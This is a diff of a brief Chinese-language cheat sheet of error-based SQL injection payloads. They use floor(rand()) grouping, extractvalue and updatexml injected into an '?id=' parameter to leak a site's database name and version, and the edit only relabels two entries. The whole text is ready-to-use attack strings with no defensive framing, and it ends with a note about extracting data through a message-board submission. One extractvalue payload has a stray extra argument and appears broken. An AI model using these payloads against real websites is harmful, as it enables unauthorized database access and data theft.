@@ -1,10 +1,10 @@
 1.报错注入
 (1)?id=1 and (select 1 from (select count(*),concat(0x5e,(select database() from information_schema.tables limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
 2.xpath报错注入
-(1)?id=0 and extractvalue(1,concat(0x5e,database()))  表名
+(1)?id=0 and extractvalue(1,concat(0x5e,database()))  数据库名
 (2)?id=1 and extractvalue(1,concat(0x5e,(select version()),0x5e),1) 版本号
 3.updatexml报错
-(1)?id=1 and updatexml(1,concat(0x5e,(select database()),0x5e),1)  表名
+(1)?id=1 and updatexml(1,concat(0x5e,(select database()),0x5e),1)  数据库名
 (2)?id=1 and updatexml(1,concat(0x5e,(select version()),0x5e),1)  版本号
 
 实战新增（直接留言提交获得数据）
